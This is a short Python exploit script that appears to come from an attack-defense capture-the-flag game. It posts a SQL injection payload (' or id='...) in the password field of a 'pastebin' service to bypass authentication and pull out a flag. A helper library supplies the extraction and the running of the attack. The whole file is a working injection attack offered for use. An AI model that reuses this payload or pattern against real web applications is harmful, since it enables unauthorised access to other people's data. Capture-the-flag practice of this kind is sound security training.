import sys
sys.path.append("../../")

import libad
import requests

def exploit(address: str, flag_id: libad.FlagId) -> str:
    response = requests.post(
        f"http://{address}/paste/{flag_id}",
        data={"password": f"' or id='{flag_id}"}
    )
    return libad.extract_flag(response.text)

if __name__ == "__main__":
    libad.run_exploit(exploit, "pastebin")
